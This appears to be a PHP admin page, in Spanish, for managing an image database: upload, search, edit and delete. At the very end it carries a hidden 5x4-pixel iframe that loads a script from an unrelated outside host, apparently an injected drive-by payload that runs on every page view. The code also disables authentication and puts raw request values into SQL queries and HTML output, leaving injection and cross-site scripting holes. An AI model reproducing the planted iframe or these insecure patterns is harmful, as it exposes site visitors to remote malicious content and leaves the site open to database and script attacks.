<?
define('authenticate', false);
include_once('../inc/conf.inc.php');
if($_REQUEST['tipo_imagen']){
	$tipo_imagen=$_REQUEST['tipo_imagen'];
	$pick=$_REQUEST['pick'];
}

$wheretipo=' categoria='.$tipo_imagen;
if($busqueda != ''){
	$where='';
	$wheretipo='1=1';
	if($tipobus==2) $wheretipo=' categoria='.$tipo_imagen;
	$bus=split(' ',$busqueda);
	$w='concat(" ",archivo_name," ",titulo," ",abstract," ",pie," ",link," ")';
	$n=0;
	foreach($bus as $a){
		$where.=$w." like '%$a%' ";
		$n++;
		if($n<count($bus)) $where.=' or ';
	}

}
if($where!='') { $where='('.$where.') and '.$wheretipo; } else { $where=$wheretipo; }
if($accion=='guardar'){
	$categoria=$tipo_imagen;
	if($id<1){
		$id=0;
		if(is_uploaded_file($archivo)){
			$db->insert('imagenes',"archivo::blob,id,nombre='$archivo_name',peso='$archivo_size',dim_x,dim_y,dim_prop,titulo,abstract,pie,categoria,link");
		}
		else{
			$db->insert('imagenes',"id,nombre='Sin Archivo',dim_x,dim_y,dim_prop,titulo,abstract,pie,categoria,link");
		}
	}
	else{
		if(is_uploaded_file($archivo)){
			$db->update('imagenes',"archivo::blob,id,nombre='$archivo_name',peso='$archivo_size',dim_x,dim_y,dim_prop,titulo,abstract,pie,categoria,link","id=$id");
		}
		else{
			$db->update('imagenes',"id,nombre='Sin Archivo',dim_x,dim_y,dim_prop,titulo,abstract,pie,categoria,fecha='$f',link","id=$id");
		}
	}		
	$accion='';
	if($altacontinua==1){
		$accion='nueva';
	}
}
if($accion=='eliminar'){
	$db->delete('imagenes',"id=$id");
	$accion='';
}
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>Untitled Document</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="stylesheet" href="../styles/estilo.css" type="text/css">
<script language="javascript" type="text/javascript">
function seltipo(){
	x=form.tipo_imagen.value
	form.submit()
}
function buscar(){
	form.submit();
}
function nuevaimagen(x){
	form.accion.value='nueva';
	if(x>0){
		form.accion.value='modificar';
		form.id.value=x;
	}
	form.submit();
}
function volver(){
	form.accion.value='';
	form.submit();
}
function guardar(){
	form.accion.value='guardar';
	form.submit();
}
function ver(x){
	window.open('verImagen.php?id='+x+'&op=2')
}
function eliminar(x){
	resp=confirm('Confirma la eliminación definitiva de este item?')
	if(resp==false) return;
	form.accion.value='eliminar';
	form.id.value=x;
	form.submit();
}
function imgsel(x){
	opener.document.getElementById('L_imagen').value=x;
	opener.document.getElementById('imagen').src="verImagen.php?id="+x;
	window.close();
}
</script>
</head>

<body>


<? 
if ($accion==''){
 ?>

<table width="90%"  border="0" align="center" cellpadding="2" cellspacing="2">
	<form name="form" method="post">
	<input type="hidden" name="accion" value="<?=$accion?>">
	<input type="hidden" name="id" value="">
  <tr>
    <td  colspan="3" class="titulo_seccion"><div align="left"><strong> &nbsp;Administrador de Imagenes</strong></div></td>
  </tr>
  <tr>
    <td width="40%" height="25">&nbsp;</td>
    <td width="1%">&nbsp;</td>
    <td width="59%">&nbsp;</td>
  </tr>
  <tr>
    <td align="center">Tipo de Imagen: 
      <select name="tipo_imagen" class="control" onChange="seltipo()">
        <?
	  	$db->select('tipo_imagen','*','1=1','descrip');
		if($db->num_rows()>0){
			echo "<option value=0> - Seleccione - </option>";
			while($row=$db->fetch_object()){
				if($tipo_imagen==$row->id){ $sel='selected';} else { $sel='';}
				echo "<option value=".$row->id." $sel>".$row->descrip."</option>";
			}
		}
	  ?>
      </select> &nbsp;
      <input name="button" type="button" class="boton_ok" value=" Nueva Imagen " onClick="nuevaimagen()"></td>
    <td align="left">&nbsp;</td>
    <td>
	Busqueda:&nbsp;<input name="busqueda" type="text" class="control" value="<?=$busqueda?>" size="35">
	&nbsp;<input type="button" class="boton_ok" value=" Ok " onClick="buscar()"> 
	    <?	$chk[$tipobus]='checked'; ?>
		 <label>
	     <input name="tipobus" type="radio" value="1" <?=$chk[1]?>>
    		Todo</label>
		<label>
	     <input type="radio" id="tipobus2" name="tipobus" value="2" <?=$chk[2]?>>
		 	en Tipo</label>
	</td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td colspan="3"><table width="100%"  border="0" cellspacing="2" cellpadding="2">


<?	if($tipo_imagen>0){
		$db->select('imagenes','*'," $where");
		if($db->num_rows()>0){
			while($row=$db->fetch_object()){
				if( $row->dim_x>$row->dim_y && $row->dim_x>0){
					$tamano=' width='.$row->dim_x;
				}
				else{
					if($row->dim_y>0){
						$tamano=' height='.$row->dim_y;
					}
				}
?>			

      <tr>
        <td colspan="6" height="5"><hr size="1" noshade></td>
      </tr>
      <tr>
			<? if($pick==1){ ?>
        <td  rowspan="4"><input type="radio" name="sel_img" value="<?=$row->id?>" onClick="imgsel(<?=$row->id?>)">
          Select</td>
		 <? } ?>
        <td width="20%" rowspan="4"><img src='<?="verImagen.php?id=$row->id"?>' width="75" onClick="ver(<?=$row->id?>)" name="foto_<?=$row->id?>"></td>
        <td width="10%" class="titulo_seccion" align="right"><div align="right">Archivo</div></td>
        <td width="12%" align="left" class="texto_normal"><div align="left"><?=$row->archivo_name?></div></td>
        <td width="11%" class="titulo_seccion"><div align="right">Titulo</div></td>
        <td width="39%" class="texto_normal"><div align="left"><?=$row->titulo?></div></td>
      </tr>
      <tr>
        <td class="titulo_seccion" align="right"><div align="right">Tama&ntilde;o</div></td>
        <td width="12%" align="left" class="texto_normal"><?=$row->peso?></td>
        <td width="11%" rowspan="2" class="titulo_seccion"><div align="right">Comentarios</div>          <div align="right"></div></td>
        <td width="39%" rowspan="2" class="texto_normal"><div align="left"><?=$row->abstract?></div></td>
      </tr>
      <tr>
        <td class="titulo_seccion"><div align="right">Tipo</div></td>
        <td width="12%" align=left class="texto_normal"><?=$row->archivo_mime?></td>
		</tr>
      <tr>
        <td class="titulo_seccion"><div align="right">Modificado</div></td>
        <td width="12%" class="texto_normal"><div align="left"><?=$row->fecha?></div></td>
        <td width="11%" class="titulo_seccion"><div align="right">Pie</div></td>
        <td width="39%" class="texto_normal"><div align="left">
          <?=$row->pie?>
        </div></td>
      </tr>
      <tr>
        <td colspan="<?= $pick==1? 2:1;?>">
          <input name="button2" type="button" class="boton_alerta" onClick="nuevaimagen(<?=$row->id?>)" value=" Modificar ">
        </td>
        <td class="titulo_seccion"><div align="right"><?="pick=".$pick?>Dimensi&oacute;n</div></td>
        <td width="12%" class="texto_normal">X=<?=$row->dim_x?> Y=<?=$row->dim_y?>&nbsp;<?=$row->dim_prop==1? '(Prop)':''; ?></td>
		<td class="titulo_seccion"><div align="right">Link</div></td>
		<td><div align="left"><?=$row->link?></div></td>
      </tr>
<?
		}
	}
}
?>
    </table>
    </td>
  </tr>
  <tr>
    <td></td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
</form>
</table>
<? } ?>

<? if ($accion=='nueva' || $accion=='modificar'){ 
	if($id>0){
		$db->select('imagenes','*',"id=$id");
		$row1=$db->fetch_object();
	}

?>
<table width="90%"  border="0" align="center" cellpadding="2" cellspacing="2">
	<form name="form" method="post" enctype="multipart/form-data">
	<input type="hidden" name="accion" value="<?=$accion?>">
	<input type="hidden" name="busqueda" value="<?=$busqueda?>">
	<input type="hidden" name="tipo_imagen" value="<?=$tipo_imagen?>">
	<input type="hidden" name="tipobus" value="<?=$tipobus?>">
	<input type="hidden" name="id" value="<?=$id?>">
  <tr>
    <td  colspan="3" class="titulo_seccion"><div align="left"><strong> &nbsp;Alta de Imagen</strong></div></td>
  </tr>
  <tr>
    <td width="41%" height="25">&nbsp;</td>
    <td width="2%">&nbsp;</td>
    <td width="57%"><div align="left">Titulo</div></td>
  </tr>
  <tr>
    <td align="center">Tipo de Imagen:
      <select name="tipo_imagen" class="control">
        <?
	  	$db->select('tipo_imagen','*','1=1','descrip');
		if($db->num_rows()>0){
			while($row=$db->fetch_object()){
				if($tipo_imagen==$row->id){ $sel='selected';} else { $sel='';}
				echo "<option value=".$row->id." $sel>".$row->descrip."</option>";
			}
		}
	  ?>
      </select>
&nbsp; </td>
      <td width="2%">&nbsp;</td>
	  <td width="57%"><div align="left">
	    <input name="titulo" type="text" class="control" value="<?=$row1->titulo?>" size="60">
	  </div></td>

	 </tr>
  <tr>
    <td align="center">&nbsp;</td>
    <td>&nbsp;</td>
    <td><div align="left">Texto&nbsp;
    </div></td>
  </tr>
  <tr>
    <td rowspan="2" align="center"><img src="<?= $id>0? './verImagen.php?id='.$id : '../img/sinimagen.gif'?>"  onClick="ver(<?=$row1->id?>)" width="75" height="75" style="cursor:hand "></td>
    <td rowspan="3">&nbsp;</td>
    <td valign="middle"><div align="left">
      <textarea name="abstract" cols="50" rows="4" class="texto_normal"><?=$row1->abstract?>
      </textarea>
    </div></td>
  </tr>
  <tr>
    <td valign="middle"><div align="left">Pie
    </div></td>
  </tr>
  <tr>
    <td align="center">Archivo:&nbsp;<big>
      <?=$row1->archivo_name!=''? "$row1->archivo_name":"No seleccionado";?>
		</big></td>
    <td><div align="left">
      <input name="pie" type="text" class="control" value="<?=$row1->pie?>" size="60">
    </div></td>
  </tr>
  <tr>
    <td align="center">
	<input type="hidden" name="MAX_FILE_SIZE" value="1024000">
	<input type="file" name="archivo" size="30" class="control"></td>
    <td>&nbsp;</td>
    <td><div align="left">Link 
      
    </div></td>
  </tr>
  <tr>
    <td align="center">Ancho: <input type="text" name="dim_x" size="5" class="control" value="<?=$row1->dim_x?>">
    px &nbsp; Alto: 
    <input name="dim_y" type="text" class="control" value="<?=$row1->dim_y?>" size="5"> 
    px  &nbsp;Proporcional <input type="checkbox" name="dim_prop" value="1" <?= $row1->dim_prop==1? 'checked':''?>></td>
    <td>&nbsp;</td>
    <td><div align="left">
      <input name="link" type="text" class="control" id="link2" value="<?=$row1->link?>" size="60">
    </div></td>
  </tr>
  <tr><td>&nbsp;</td></tr>
  <tr>
    <td colspan="3" class="titulo_seccion"  align="center"><div align="center">
     <? if($accion=='nueva'){ ?>
		 Alta continua&nbsp;<input type="checkbox" value="1" name="altacontinua">&nbsp;
	 <? } ?>
	 <input type="button" class="boton_ok" value=" Guardar Cambios " onClick="guardar()">
        &nbsp;
        <input type="button" class="boton_alerta" value="Volver sin guardar" onClick="volver()">
	 <? if($accion=='modificar'){ ?>
			&nbsp;&nbsp;<input type="button" class="boton_critico" onClick="eliminar(<?=$row1->id?>)" value=" Eliminar ">
	<? } ?>

    </div>
	</td>
  </tr>
	</table>
<? } ?>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</html>
